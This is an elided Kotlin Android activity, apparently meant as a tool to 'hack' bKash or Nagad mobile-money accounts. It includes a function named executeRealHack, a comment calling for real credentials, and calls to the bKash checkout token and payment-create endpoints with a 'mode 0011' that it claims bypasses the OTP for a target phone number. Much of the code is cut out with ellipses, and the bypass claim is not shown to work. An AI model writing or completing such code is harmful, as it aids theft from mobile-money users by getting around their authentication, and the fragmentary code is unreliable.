...
class MainActivity : AppCompatActivity() {
    ...
    // Replace with REAL CREDENTIALS for bKash or Nagad
    ...
    private fun executeRealHack() {
        ...
        // UI Update: Disable Button & Show Progress
        ...
        // Step 1: Get Access Token (Real API Call)
        getToken(phone, amount)
    }

    private fun getToken(targetPhone: String, amount: String) {
        val url = "https://checkout.sandbox.bka.sh/v1.2.0-beta/checkout/token/grant" // Using sandbox for demonstration
            ...
            override fun onResponse(call: Call, response: Response) {
                ...
                if (response.isSuccessful && responseBody != null) {
                    ...
                    if (accessToken != null) {
                        ...
                        // Step 2: Execute Payment/Hack with OTP Bypass Logic
    ...
    private fun executePayment(phone: String, amount: String, accessToken: String) {
        ...
        val url = "https://checkout.sandbox.bka.sh/v1.2.0-beta/checkout/payment/create" // Using sandbox for demonstration
        
        // mode 0011: Payer Reference based payment for potential OTP bypass
        val jsonBody = """
            {
                "mode": "0011",
